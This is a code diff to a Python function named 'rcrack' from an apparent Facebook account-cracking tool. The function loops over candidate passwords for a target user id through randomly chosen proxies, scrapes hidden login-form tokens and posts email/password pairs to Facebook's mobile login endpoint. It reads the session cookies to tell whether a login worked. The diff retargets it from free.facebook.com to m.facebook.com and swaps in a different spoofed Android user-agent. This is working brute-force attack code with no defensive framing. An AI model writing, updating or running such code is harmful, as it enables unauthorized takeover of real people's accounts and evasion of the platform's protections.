@@ -159,18 +159,18 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(proxy)
             session = requests.Session()
-            free_fb = session.get('https://free.facebook.com').text
+            m_fb = session.get('https://m.facebook.com').text
             log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+                "lsd":re.search('name="lsd" value="(.*?)"', str(m_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(m_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(m_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(m_fb)).group(1),
             "try_number":"0",
             "unrecognized_tries":"0",
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority':'m.facebook.com',
+            header_mfb = {'authority':'m.facebook.com',
             'method': 'GET',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -183,7 +183,7 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-             'user-agent':'Mozilla/5.0 (Linux; Android 10; TECNO CE8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36',}
+             'user-agent':'Mozilla/5.0 (Linux; Android 8.1.0; TECNO RB7S Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36',}
             lo = session.get('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_mfb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
